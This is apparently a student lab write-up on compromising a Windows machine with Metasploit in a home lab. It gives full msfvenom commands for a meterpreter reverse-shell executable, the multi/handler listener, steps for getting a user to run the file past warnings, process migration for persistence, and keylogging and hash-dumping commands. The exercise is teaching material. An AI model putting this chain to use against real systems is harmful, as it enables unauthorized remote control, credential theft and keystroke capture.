# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:

<img width="760" height="338" alt="image" src="https://github.com/user-attachments/assets/77b8139b-4cd1-47be-bb96-e4e2a14fa6f7" />

<img width="777" height="125" alt="image" src="https://github.com/user-attachments/assets/1d346a15-f51c-4d74-a452-0a99a32d2c79" />


copy the fun.exe into the apache ```/var/www/html ```folder

<img width="316" height="50" alt="image" src="https://github.com/user-attachments/assets/923bba31-86a7-4859-9a08-1f64daa7b46b" />


Start apache server ```sudo systemctl apache2 start``` 

<img width="349" height="53" alt="image" src="https://github.com/user-attachments/assets/ffbad688-d9ad-4016-85b8-ae4ff20cf592" />


Check the status of apache2 ```sudo apache2 status```

<img width="1890" height="413" alt="image" src="https://github.com/user-attachments/assets/4328d200-fcbb-402e-999d-b061ae8439ce" />

Invoke msfconsole:

<img width="1890" height="749" alt="image" src="https://github.com/user-attachments/assets/274ab86a-9bcd-44a9-8908-d3fc060aad28" />


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

<img width="1184" height="907" alt="image" src="https://github.com/user-attachments/assets/5d5a6c30-be02-4ddb-813d-5c2014c07525" />


Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

<img width="640" height="274" alt="image" src="https://github.com/user-attachments/assets/ad2bcfac-7705-4960-9ed3-1444c2386f8c" />
<img width="929" height="165" alt="image" src="https://github.com/user-attachments/assets/367cf103-221b-4a91-97ec-435762e45f4f" />


### Output 


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.

<img width="1919" height="1139" alt="Screenshot 2025-10-06 090448" src="https://github.com/user-attachments/assets/0441c906-9b88-4b5c-83f7-3dd926a0eab7" />


Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit



To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



keyscan_dump Shows the keystrokes captured so far



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

